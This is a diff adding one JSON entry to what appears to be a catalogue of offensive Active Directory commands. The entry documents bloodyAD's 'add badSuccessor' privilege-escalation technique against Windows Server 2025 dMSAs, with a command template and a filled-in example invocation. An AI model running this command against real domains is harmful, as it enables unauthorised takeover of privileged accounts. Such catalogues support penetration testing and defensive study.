@@ -1,0 +1,16 @@
+{
+  "id": "bloodyad-badsuccessor",
+  "name": "bloodyAD add badSuccessor",
+  "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' add badSuccessor '<dmsa-name>'",
+  "description": "Create a Delegated Managed Service Account (dMSA) and chain it via msDS-ManagedAccountPrecededByLink to a privileged target. The dMSA inherits the predecessor's keys/permissions on next logon — Server 2025 BadSuccessor abuse. Requires CreateChild on an OU.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap"],
+  "tags": ["bloodyad", "badsuccessor", "dmsa", "server-2025", "privesc"],
+  "references": [
+    { "title": "BadSuccessor (Akamai)", "url": "https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory" }
+  ],
+  "examples": [
+    "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' add badSuccessor pwndmsa"
+  ]
+}
